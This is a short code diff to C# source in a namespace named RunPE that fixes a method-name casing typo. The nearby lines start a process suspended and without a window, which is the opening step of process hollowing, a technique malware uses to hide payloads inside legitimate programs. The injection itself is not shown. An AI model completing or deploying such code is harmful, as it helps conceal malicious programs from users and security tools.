@@ -84,7 +84,7 @@ namespace RunPE
                 int readWrite = 0x0;
                 StartupInformation si = new StartupInformation();
                 ProcessInformation pi = new ProcessInformation();
-                si.Size = Convert.Toint32(Marshal.SizeOf(typeof(StartupInformation)));
+                si.Size = Convert.ToInt32(Marshal.SizeOf(typeof(StartupInformation)));
                 try
                 {
                     if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
